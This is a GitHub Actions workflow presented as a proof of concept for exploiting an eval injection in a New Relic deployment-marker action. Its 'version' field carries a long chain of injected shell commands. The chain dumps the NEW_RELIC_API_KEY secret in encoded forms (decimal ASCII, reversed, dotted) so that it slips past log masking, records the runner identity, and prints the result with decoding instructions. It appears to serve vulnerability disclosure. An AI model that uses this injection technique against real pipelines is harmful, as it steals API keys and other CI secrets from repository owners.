name: "PoC: API Key Exfil (ASCII decimal bypass)"

on:
  workflow_dispatch:

jobs:
  prove-secret-exfil:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Mark deployment (eval injection)
        uses: newrelic/deployment-marker-action@v2.6.2
        continue-on-error: true
        with:
          apiKey: ${{ secrets.NEW_RELIC_TEST_KEY }}
          commandType: changeTrackingCreateEvent
          category: Deployment
          type: BASIC
          entitySearch: "domain = 'APM' AND name = 'TestApp'"
          version: 'v1.0$(echo "=== EVAL INJECTION PROOF ===" > /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[1] API key as decimal ASCII (bypasses ALL masking):" >> /github/workspace/exfil_proof.txt && printf "%s" "$NEW_RELIC_API_KEY" | od -An -td1 | tr -s " " >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[2] API key reversed:" >> /github/workspace/exfil_proof.txt && echo "$NEW_RELIC_API_KEY" | rev >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[3] API key char-by-char with dots:" >> /github/workspace/exfil_proof.txt && echo "$NEW_RELIC_API_KEY" | fold -w1 | paste -sd"." - >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[4] Key length:" >> /github/workspace/exfil_proof.txt && printf "%s" "$NEW_RELIC_API_KEY" | wc -c >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[5] Running as:" >> /github/workspace/exfil_proof.txt && id >> /github/workspace/exfil_proof.txt && echo INJECTED)'

      - name: "Display exfiltration proof"
        run: |
          echo "╔══════════════════════════════════════════════════════════╗"
          echo "║  PROOF: eval injection exfiltrates NEW_RELIC_API_KEY    ║"
          echo "╚══════════════════════════════════════════════════════════╝"
          echo ""
          if [ -f exfil_proof.txt ]; then
            cat exfil_proof.txt
            echo ""
            echo "═══════════════════════════════════════════════════════════"
            echo "To decode the decimal ASCII values back to the API key:"
            echo "  python3 -c \"print(''.join(chr(int(x)) for x in '78 82 65 75 ...'.split()))\""
            echo ""
            echo "CONFIRMED: entrypoint.sh:117 eval injection gives"
            echo "full read access to NEW_RELIC_API_KEY and all secrets."
          else
            echo "ERROR: exfil_proof.txt not created"
          fi
